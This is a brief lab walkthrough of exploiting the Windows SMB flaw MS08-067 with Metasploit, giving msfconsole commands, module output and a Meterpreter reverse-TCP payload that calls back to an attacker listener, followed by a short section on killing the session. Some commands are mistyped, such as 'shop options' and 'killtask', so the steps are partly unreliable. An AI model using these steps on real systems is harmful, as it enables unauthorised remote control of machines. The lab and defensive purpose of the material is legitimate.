Attack:

1, Search CVE2008-4250 on CVE Details and found there's 1 Metasploit modules avaliable that called "exploit/windows/smb/ms08_067_netapi"
 
2, Start msf by typing "msfconsole" on CLI or Just start Metasploit Framework via GUI 

P.S If you do not know the model name you can try to search model in msfconsole by typing "search ms08-067"

3, Use the model in msfconsole by typing "use exploit/windows/smb/ms08_067_netapi"

4, Type "shop options" to show all the requirement for this Scripts? 

Output: 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   
   ----     ---------------  --------  -----------
   
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   
   RPORT    445              yes       The SMB service port (TCP)
   
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   
   ----      ---------------  --------  -----------
   
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   
   LHOST     192.168.123.50   yes       The listen address (an interface may be specified)
   
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   
   --  ----
   
   0   Automatic Targeting
   
   As you can see we need RHOST(Remote Host), So we need to specified Remote Host by Typing "set RHOST {Target IP}"
   
   5, Type "show payloads" to show all compatible payloads, and type "set payload {payload location} if needed.
   
   6, Now we got all the info ready, Just Type run or exploit to start
   
   Defense:
   
   1, Type "netstat -o" to find net task PID.
   
   2,Type "killtask /F /PID {PID} to kill the process
   
   3,msf console should show up "192.168.123.46 - Meterpreter session 1 closed.  Reason: Died" after you kill the process




